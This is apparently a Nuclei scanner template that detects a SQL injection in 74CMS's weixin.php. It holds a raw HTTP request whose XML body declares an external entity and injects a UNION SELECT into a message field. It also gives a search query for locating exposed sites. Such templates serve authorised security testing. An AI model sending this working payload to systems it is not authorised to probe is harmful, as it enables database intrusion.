http:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5(num)}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce=
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/xml


    <?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM
    "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%''
    union select md5({{num}})#</Content></xml>

    '
id: 74cms-weixin-sqli
info:
  author: SleepingBag945
  classification:
    cpe: cpe:2.3:a:74cms:74cms:*:*:*:*:*:*:*:*
  description: 'There is a libxml_disable_entity_loader function to prevent XML eXternal
    Entity Injection, but this function needs to be customized by the user. If the
    user does not customize it, there will be no filtering, which leads to SQL injection
    vulnerabilities.

    '
  metadata:
    fofa-query: "app=\"\u9A91\u58EB-74CMS\""
    max-request: 1
    product: 74cms
    vendor: 74cms
    verified: true
  name: 74CMS weixin.php - SQL Injection
  reference:
  - https://cn-sec.com/archives/25900.html
  severity: high
  tags: 74cms,weixin,sqli,vuln
variables:
  num: '999999999'
